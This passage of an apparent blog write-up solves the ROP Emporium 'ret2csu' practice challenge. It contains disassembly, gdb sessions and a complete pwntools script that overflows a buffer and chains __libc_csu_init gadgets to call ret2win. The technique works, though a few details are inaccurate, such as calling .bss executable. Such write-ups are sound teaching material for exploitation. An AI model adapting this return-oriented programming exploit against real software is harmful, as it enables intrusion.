  <span class="err">400678:</span>	<span class="err">0</span><span class="nf">f</span> <span class="mi">1</span><span class="nv">f</span> <span class="mi">84</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 	<span class="nv">nop</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="o">+</span><span class="nb">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
  <span class="err">40067</span><span class="nl">f:</span>	<span class="err">00</span>
  <span class="err">400680:</span>	<span class="err">4</span><span class="nf">c</span> <span class="mi">89</span> <span class="nv">fa</span>             	<span class="nv">mov</span>    <span class="nb">rdx</span><span class="p">,</span><span class="nv">r15</span>
  <span class="err">400683:</span>	<span class="err">4</span><span class="nf">c</span> <span class="mi">89</span> <span class="nv">f6</span>             	<span class="nv">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="nv">r14</span>
  <span class="err">400686:</span>	<span class="err">44</span> <span class="err">89</span> <span class="nf">ef</span>             	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="nb">r13d</span>
  <span class="err">400689:</span>	<span class="err">41</span> <span class="nf">ff</span> <span class="mi">14</span> <span class="nv">dc</span>          	<span class="nv">call</span>   <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="nb">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
  <span class="err">40068</span><span class="nl">d:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">c3</span> <span class="mi">01</span>          	<span class="nv">add</span>    <span class="nb">rbx</span><span class="p">,</span><span class="mh">0x1</span>
  <span class="err">400691:</span>	<span class="err">48</span> <span class="err">39</span> <span class="kd">dd</span>             	<span class="nv">cmp</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rbx</span>
  <span class="err">400694:</span>	<span class="err">75</span> <span class="nf">ea</span>                	<span class="nv">jne</span>    <span class="mi">400680</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mh">0x40</span><span class="o">&gt;</span>
  <span class="err">400696:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">08</span>          	<span class="nv">add</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x8</span>
  <span class="err">40069</span><span class="nl">a:</span>	<span class="err">5</span><span class="nf">b</span>                   	<span class="nv">pop</span>    <span class="nb">rbx</span>
  <span class="err">40069</span><span class="nl">b:</span>	<span class="err">5</span><span class="nf">d</span>                   	<span class="nv">pop</span>    <span class="nb">rbp</span>
  <span class="err">40069</span><span class="nl">c:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">c</span>                	<span class="nv">pop</span>    <span class="nv">r12</span>
  <span class="err">40069</span><span class="nl">e:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">d</span>                	<span class="nv">pop</span>    <span class="nv">r13</span>
  <span class="err">4006</span><span class="nl">a0:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">e</span>                	<span class="nv">pop</span>    <span class="nv">r14</span>
  <span class="err">4006</span><span class="nl">a2:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">f</span>                	<span class="nv">pop</span>    <span class="nv">r15</span>
  <span class="err">4006</span><span class="nl">a4:</span>	<span class="nf">c3</span>                   	<span class="nv">ret</span>
  <span class="err">4006</span><span class="nl">a5:</span>	<span class="err">90</span>                   	<span class="nf">nop</span>
  <span class="err">4006</span><span class="nl">a6:</span>	<span class="err">66</span> <span class="err">2</span><span class="nf">e</span> <span class="mi">0</span><span class="nv">f</span> <span class="mi">1</span><span class="nv">f</span> <span class="mi">84</span> <span class="mi">00</span> <span class="mi">00</span> 	<span class="nb">cs</span> <span class="nv">nop</span> <span class="kt">WORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="o">+</span><span class="nb">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
  <span class="err">4006</span><span class="nl">ad:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span>

<span class="err">00000000004006</span><span class="nf">b0</span> <span class="o">&lt;</span><span class="nv">__libc_csu_fini</span><span class="o">&gt;</span><span class="p">:</span>
  <span class="err">4006</span><span class="nl">b0:</span>	<span class="nf">f3</span> <span class="nv">c3</span>                	<span class="nv">repz</span> <span class="nv">ret</span> <span class="nv">z</span>
</pre></table></code></div></div><p>The <strong>__libc_csu_init</strong> section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control <strong>RBX, RBP, R12, R13, R14, and R15</strong> registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.</p><p>The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>  <span class="err">40069</span><span class="nl">a:</span>	<span class="err">5</span><span class="nf">b</span>                   	<span class="nv">pop</span>    <span class="nb">rbx</span>
  <span class="err">40069</span><span class="nl">b:</span>	<span class="err">5</span><span class="nf">d</span>                   	<span class="nv">pop</span>    <span class="nb">rbp</span>
  <span class="err">40069</span><span class="nl">c:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">c</span>                	<span class="nv">pop</span>    <span class="nv">r12</span>
  <span class="err">40069</span><span class="nl">e:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">d</span>                	<span class="nv">pop</span>    <span class="nv">r13</span>
  <span class="err">4006</span><span class="nl">a0:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">e</span>                	<span class="nv">pop</span>    <span class="nv">r14</span>
  <span class="err">4006</span><span class="nl">a2:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">f</span>                	<span class="nv">pop</span>    <span class="nv">r15</span>
  <span class="err">4006</span><span class="nl">a4:</span>	<span class="nf">c3</span>                   	<span class="nv">ret</span>
</pre></table></code></div></div><p>For the second stage, we need to look for the gadgets that will enable us to control the <strong>RDI, RSI and RDX</strong> registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in <strong>RDI, RSI and RDX</strong> registers respectively. From the disassembly of <strong>__libc_csu_init</strong> we can get our second gadget to build our rop chain.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nf">mov</span>    <span class="nb">rdx</span><span class="p">,</span><span class="nv">r15</span>
<span class="nf">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="nv">r14</span>
<span class="nf">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="nb">r13d</span>
<span class="nf">call</span>   <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="nb">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
</pre></table></code></div></div><p>From the above code, we are now able to control the <strong>rdx, rsi and edi</strong> registers.The call in the second stage gadgets, calculates the destination address of our code.</p><p>Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to <strong>ret2win</strong> challenge.</p><blockquote><p>This challenge is very similar to “callme”, with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the “callme” challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM &amp; MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.</p></blockquote><p>From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">rdi</span> <span class="o">&lt;--</span> <span class="nv">r13</span> <span class="o">&lt;--</span>  <span class="err">#</span><span class="nv">first</span> <span class="nv">args</span>   <span class="mh">0xdeadbeefdeadbeef</span>
<span class="nf">rsi</span> <span class="o">&lt;--</span> <span class="nv">r14</span> <span class="o">&lt;--</span>  <span class="err">#</span><span class="nv">second</span> <span class="nv">args</span>  <span class="mh">0xcafebabecafebabe</span>
<span class="nf">rdx</span> <span class="o">&lt;--</span> <span class="nv">r15</span> <span class="o">&lt;--</span>  <span class="err">#</span><span class="nv">third</span> <span class="nv">args</span>   <span class="mh">0xd00df00dd00df00d</span>
</pre></table></code></div></div><p>From code snip above, we can control the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb to ensure that there is no unexpected behavior which may cause crashes.</p><p>Set a breakpoint in our first address of the ropchain gadget, and run binary with the generated payload.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">break</span> <span class="o">*</span><span class="mh">0x000000000040069a</span>
<span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x40069a</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">r</span> <span class="o">&lt;/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">payload</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vx</span><span class="o">/</span><span class="nv">Downloads</span><span class="o">/</span><span class="nv">rop</span><span class="o">/</span><span class="nv">rop</span><span class="o">/</span><span class="nv">ret2csu</span><span class="o">/</span><span class="nv">ret2csu</span> <span class="o">&lt;/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">payload</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000000000040069a</span> <span class="nv">in</span> <span class="nv">__libc_csu_init</span> <span class="p">()</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">c</span>
<span class="nf">Continuing.</span>
<span class="nf">ret2csu</span> <span class="nv">by</span> <span class="nv">ROP</span> <span class="nv">Emporium</span>
<span class="nf">x86_64</span>
<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000000000040069a</span> <span class="nv">in</span> <span class="nv">__libc_csu_init</span> <span class="p">()</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</pre></table></code></div></div><p>When the program is run,it hits the set breakpoint. Type <strong>c</strong> command for paused process to continue the execution. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of breakpoint, the execution stops. We can inspect the memory to understand the behavior of the program and values loaded in the registers.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">x</span><span class="o">/</span><span class="mi">10</span><span class="nv">i</span> <span class="kc">$</span><span class="nv">rip</span>
<span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x40069a</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nb">rbx</span>
   <span class="err">0</span><span class="nf">x40069b</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x40069c</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nv">r12</span>
   <span class="err">0</span><span class="nf">x40069e</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nv">r13</span>
   <span class="err">0</span><span class="nf">x4006a0</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nv">r14</span>
   <span class="err">0</span><span class="nf">x4006a2</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nv">r15</span>
   <span class="err">0</span><span class="nf">x4006a4</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
   <span class="err">0</span><span class="nl">x4006a5:</span>	<span class="nf">nop</span>
   <span class="err">0</span><span class="nl">x4006a6:</span>	<span class="nf">nop</span>    <span class="kt">WORD</span> <span class="nv">PTR</span> <span class="nb">cs</span><span class="p">:[</span><span class="nb">rax</span><span class="o">+</span><span class="nb">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x4006b0</span> <span class="o">&lt;</span><span class="nv">__libc_csu_fini</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">repz</span> <span class="nv">ret</span>
</pre></table></code></div></div><p>Now we can Single step in the debugger and view the values stored in the registers of our gadget. The command for single stepping in gdb is <strong>si</strong>.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">i</span> <span class="nv">r</span> <span class="nb">rbx</span> <span class="nb">rbp</span> <span class="nv">r12</span> <span class="nv">r13</span> <span class="nv">r14</span> <span class="nv">r15</span>
<span class="nf">rbx</span>            <span class="mh">0x4343434343434343</span>  <span class="mi">4846791580151137091</span>
<span class="nf">rbp</span>            <span class="mh">0x4242424242424242</span>  <span class="mh">0x4242424242424242</span>
<span class="nf">r12</span>            <span class="mh">0x4141414141414141</span>  <span class="mi">4702111234474983745</span>
<span class="nf">r13</span>            <span class="mh">0xdeadbeefdeadbeef</span>  <span class="o">-</span><span class="mi">2401053088876216593</span>
<span class="nf">r14</span>            <span class="mh">0xcafebabecafebabe</span>  <span class="o">-</span><span class="mi">3819410105351357762</span>
<span class="nf">r15</span>            <span class="mh">0xd00df00dd00df00d</span>  <span class="o">-</span><span class="mi">3454841397007486963</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</pre></table></code></div></div><p>From assembly code code above we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nf">import</span> <span class="nv">pwn</span>

<span class="nf">pop_gadget</span> <span class="err">=</span> <span class="nv">pwn.p64</span><span class="p">(</span><span class="mh">0x0040069a</span><span class="p">)</span>
<span class="nf">payload</span> <span class="err">=</span><span class="nv">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">32</span> <span class="err">#</span><span class="nv">fill</span> <span class="nv">the</span> <span class="nv">buffer</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span><span class="nv">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="err">#</span><span class="nb">rbp</span><span class="p">(</span><span class="nv">saved</span><span class="p">)</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span> <span class="nv">pop_gadget</span>  <span class="err">#</span><span class="nv">retaddr</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span> <span class="nv">pwn.p64</span><span class="p">(</span><span class="mh">0x4343434343434343</span><span class="p">)</span><span class="err">#</span><span class="nb">rbx</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span> <span class="nv">pwn.p64</span><span class="p">(</span><span class="mh">0x4242424242424242</span><span class="p">)</span><span class="err">#</span><span class="nb">rbp</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span> <span class="nv">pwn.p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span> <span class="err">#</span><span class="nv">r12</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span> <span class="nv">pwn.p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="err">#</span><span class="nv">r13</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span> <span class="nv">pwn.p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span> <span class="err">#</span><span class="nv">r14</span>
<span class="nf">payload</span> <span class="o">+</span><span class="err">=</span> <span class="nv">pwn.p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span> <span class="err">#</span><span class="nv">r15</span>
<span class="nf">open</span><span class="p">(</span><span class="s">'payload'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span><span class="nv">.write</span><span class="p">(</span><span class="nv">payload</span><span class="p">)</span>
</pre></table></code></div></div><p>Next step is determining the correct or desired values for <strong>rbx, rbp and r12</strong> registers because 0x41…, 0x42…., 0x43… are not valid memory addresses.For execution of second rop gadget chain, we need to set right values of <code class="language-plaintext highlighter-rouge">rbp</code> and <code class="language-plaintext highlighter-rouge">rbx</code> due to a loop conditional.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>   <span class="err">0</span><span class="nf">x0000000000400680</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdx</span><span class="p">,</span><span class="nv">r15</span>
   <span class="err">0</span><span class="nf">x0000000000400683</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="nv">r14</span>
   <span class="err">0</span><span class="nf">x0000000000400686</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="nb">r13d</span>
   <span class="err">0</span><span class="nf">x0000000000400689</span> <span class="o">&lt;+</span><span class="mi">73</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="nb">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x000000000040068d</span> <span class="o">&lt;+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">rbx</span><span class="p">,</span><span class="mh">0x1</span>
   <span class="err">0</span><span class="nf">x0000000000400691</span> <span class="o">&lt;+</span><span class="mi">81</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rbx</span>
   <span class="err">0</span><span class="nf">x0000000000400694</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x400680</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400696</span> <span class="o">&lt;+</span><span class="mi">86</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x8</span>
</pre></table></code></div></div><p>Second gadget starts at <strong>0x0000000000400680</strong>,in which we are set values of rdi,r14 and rdx with correct argument values. Set values of <strong>rbx</strong> and <strong>rbp</strong> correctly so that conditional <strong>cmp</strong> is always true. Because of add instruction of 1 to rbx, <code class="language-plaintext highlighter-rouge">rbx</code> value needs to be 0 and <code class="language-plaintext highlighter-rouge">rbp</code> value to 1. when the registers are compared, the values are equal and Zero flag is set.</p><p>NB: “Adjust values in payload script and single step to confirm the validity of new values in the memory.”</p><p>For register <strong>r12</strong>, the address should lie in executable memory address. The <strong>.bss</strong> section is executable, therefore r12 should be set to memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.</p><p>Lastly we need to control the <strong>rdi</strong> register with the value <strong>0xdeadbeefdeadbeef</strong>. Because we have full control of rdx and rsi register, next is to look for a <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>  <span class="err">0</span><span class="nf">x004006a3</span>                 <span class="mi">5</span><span class="nv">f</span>  <span class="nv">pop</span> <span class="nb">rdi</span>
  <span class="err">0</span><span class="nf">x004006a4</span>                 <span class="nv">c3</span>  <span class="nv">ret</span>
</pre></table></code></div></div><p>Now we can pass the <strong>0xdeadbeefdeadbeef</strong> argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.</p><p>The full code of the rop chain is as shown below.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s">"latin-1"</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">warnings</span><span class="p">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'./ret2csu'</span><span class="p">)</span>

<span class="c1">#arguments passed to ret2win function ret2win(arg1, arg2, arg3)
</span><span class="n">arg1</span> <span class="o">=</span><span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
<span class="n">arg2</span> <span class="o">=</span><span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span>
<span class="n">arg3</span> <span class="o">=</span><span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span>

<span class="n">ret2win_addr</span> <span class="o">=</span><span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'ret2win'</span><span class="p">])</span>   <span class="c1">#resolve address of ret2win function
</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0040069a</span><span class="p">)</span>  <span class="c1">#first stage gadget
</span><span class="n">dereference_pointer</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00600e48</span><span class="p">)</span>  <span class="c1">#bss area which is executable
</span><span class="n">stage2_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00400680</span><span class="p">)</span>  <span class="c1">#addr of second stage rop chain
</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x004006a3</span><span class="p">)</span>

<span class="c1"># ropchains
#stage1 ropchain
</span><span class="s">'''
            0x0040069a      pop   rbx
│           0x0040069b      pop   rbp
│           0x0040069c      pop   r12
│           0x0040069e      pop   r13
│           0x004006a0      pop   r14
│           0x004006a2      pop   r15
└           0x004006a4      ret
'''</span>
<span class="c1">#Determine the loop values for conditional branch
</span><span class="s">'''
╎│          0x00400689      call  qword [r12 + rbx*8]
│      ╎│   0x0040068d      add   rbx, 1
│      ╎│   0x00400691      cmp   rbp, rbx
│      └──&lt; 0x00400694      jne   0x400680
'''</span>

<span class="n">stage1</span> <span class="o">=</span> <span class="n">pop_rbx_rbp_r12_r13_r14_r15_addr</span>
<span class="n">stage1</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>   <span class="c1">#set RBP=0
</span><span class="n">stage1</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>   <span class="c1">#set RBX=1
</span><span class="n">stage1</span> <span class="o">+=</span> <span class="n">dereference_pointer</span> <span class="c1">#set R12
</span><span class="n">stage1</span> <span class="o">+=</span> <span class="n">arg1</span>   <span class="c1">#R13
</span><span class="n">stage1</span> <span class="o">+=</span> <span class="n">arg2</span>   <span class="c1">#R14
</span><span class="n">stage1</span> <span class="o">+=</span> <span class="n">arg3</span>   <span class="c1">#R15
</span><span class="n">stage1</span> <span class="o">+=</span> <span class="n">stage2_addr</span>
<span class="n">stage1</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>   <span class="c1">#adjust the stack
</span>
<span class="c1">#stage2
</span><span class="s">'''
   ┌──&gt;     0x00400680      mov   rdx, r15
│      ╎│   0x00400683      mov   rsi, r14
│      ╎│   0x00400686      mov   edi, r13d
│      ╎│   0x00400689      call  qword [r12 + rbx*8]
'''</span>

<span class="n">stage2</span> <span class="o">=</span> <span class="n">pop_rdi</span>
<span class="n">stage2</span> <span class="o">+=</span><span class="n">arg1</span>
<span class="n">stage2</span> <span class="o">+=</span><span class="n">ret2win_addr</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">32</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">""</span> <span class="p">.</span><span class="n">join</span><span class="p">([</span>
    <span class="n">stage1</span><span class="p">,</span>
    <span class="n">stage2</span>
    <span class="p">])</span>

<span class="n">io</span><span class="p">.</span><span class="n">writeafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
